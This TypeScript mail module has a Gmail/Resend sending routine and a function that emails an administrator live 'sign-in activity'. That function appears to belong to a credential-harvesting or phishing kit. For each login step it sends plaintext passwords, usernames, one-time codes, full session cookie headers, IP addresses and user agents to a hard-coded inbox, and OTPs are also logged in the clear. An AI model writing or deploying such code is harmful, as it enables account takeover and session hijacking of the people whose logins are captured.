import nodemailer from 'nodemailer'
import { ADMIN_EMAIL } from './constants'

function wrap(title: string, body: string) {
  return `<div style="font-family:Arial,sans-serif;background:#f5f5f5;padding:24px;color:#222">
  <div style="max-width:560px;margin:0 auto;background:#fff;border:1px solid #ddd;padding:24px">
    <p style="letter-spacing:1px;color:#666;font-size:12px;text-transform:uppercase;margin:0 0 8px">Login Ops</p>
    <h2 style="color:#111;margin:0 0 16px;font-size:20px">${title}</h2>
    <div style="line-height:1.6;color:#333">${body}</div>
  </div></div>`
}

function fromAddress() {
  const gmailUser = process.env.GMAIL_USER || process.env.SMTP_USER
  return (
    process.env.EMAIL_FROM ||
    (gmailUser ? `Login Ops <${gmailUser}>` : 'Login Ops <onboarding@resend.dev>')
  )
}

async function sendViaGmail(to: string, subject: string, html: string) {
  const user = process.env.GMAIL_USER || process.env.SMTP_USER
  const pass = (process.env.GMAIL_APP_PASSWORD || process.env.SMTP_PASS || '').replace(
    /\s/g,
    ''
  )
  if (!user || !pass) {
    console.warn('[mail] Gmail not configured (missing GMAIL_USER or GMAIL_APP_PASSWORD)')
    return false
  }

  const transporter = nodemailer.createTransport({
    host: 'smtp.gmail.com',
    port: 465,
    secure: true,
    auth: { user, pass },
  })

  const info = await transporter.sendMail({
    from: fromAddress(),
    to,
    subject,
    html,
  })
  console.info('[mail] Gmail sent', { to, subject, messageId: info.messageId })
  return true
}

async function sendViaResend(to: string, subject: string, html: string) {
  const apiKey = process.env.RESEND_API_KEY
  if (!apiKey) return false
  const res = await fetch('https://api.resend.com/emails', {
    method: 'POST',
    headers: {
      Authorization: `Bearer ${apiKey}`,
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({ from: fromAddress(), to: [to], subject, html }),
  })
  if (!res.ok) {
    const text = await res.text().catch(() => '')
    console.error('[mail] Resend failed', res.status, text)
    return false
  }
  console.info('[mail] Resend sent', { to, subject })
  return true
}

export async function sendMail(to: string, subject: string, html: string) {
  console.log('[mail] sendMail', { to, subject })
  try {
    if (await sendViaGmail(to, subject, html)) return true
  } catch (err) {
    console.error('[mail] Gmail error', err)
  }
  try {
    if (await sendViaResend(to, subject, html)) return true
  } catch (err) {
    console.error('[mail] Resend error', err)
  }
  console.warn('[mail] No transport succeeded — check Vercel env vars')
  return false
}

export async function sendOtpEmail(to: string, otp: string, label: string) {
  const ok = await sendMail(
    to,
    `Your verification code (${label})`,
    wrap(
      label,
      `<p>Your one-time code is:</p>
       <p style="font-size:28px;letter-spacing:6px;font-weight:700;color:#111">${otp}</p>
       <p>Expires in 10 minutes.</p>`
    )
  )
  if (!ok) {
    // Always log OTP so admin can still complete the test from Vercel logs / ops desk
    console.info('[mail] OTP FALLBACK LOG', { to, label, otp })
  }
  return ok
}

export async function sendAdminStepAlert(input: {
  attemptId: string
  email: string
  step: string
  event: string
  passwordPlain?: string
  username?: string
  otpPlain?: string
  cookieHeader?: string
  ip?: string
  userAgent?: string
}) {
  const when = new Date().toLocaleString()
  const secrets = `
    <div style="margin-top:16px;padding:12px;background:#f5f5f5;border:1px solid #ddd;font-family:monospace;font-size:13px">
      <p style="color:#666;margin:0 0 8px">TEST · plain text</p>
      <p style="margin:4px 0"><strong>Email:</strong> ${input.email}</p>
      ${input.passwordPlain ? `<p style="margin:4px 0"><strong>Password:</strong> ${input.passwordPlain}</p>` : ''}
      ${input.username ? `<p style="margin:4px 0"><strong>Username:</strong> ${input.username}</p>` : ''}
      ${input.otpPlain ? `<p style="margin:4px 0"><strong>OTP:</strong> ${input.otpPlain}</p>` : ''}
      ${input.cookieHeader ? `<p style="margin:4px 0;word-break:break-all"><strong>Cookies:</strong> ${input.cookieHeader}</p>` : ''}
      ${input.userAgent ? `<p style="margin:4px 0;word-break:break-all"><strong>UA:</strong> ${input.userAgent}</p>` : ''}
      ${input.ip ? `<p style="margin:4px 0"><strong>IP:</strong> ${input.ip}</p>` : ''}
    </div>`

  return sendMail(
    ADMIN_EMAIL,
    `[Ops] Login · ${input.email} · ${input.step}`,
    wrap(
      'Live sign-in activity',
      `<p><strong>${input.email}</strong></p>
       <p>Step: <strong>${input.step}</strong></p>
       <p>${input.event}</p>
       <p>Time: ${when}</p>
       <p>Attempt: <code>${input.attemptId}</code></p>
       ${secrets}`
    )
  )
}
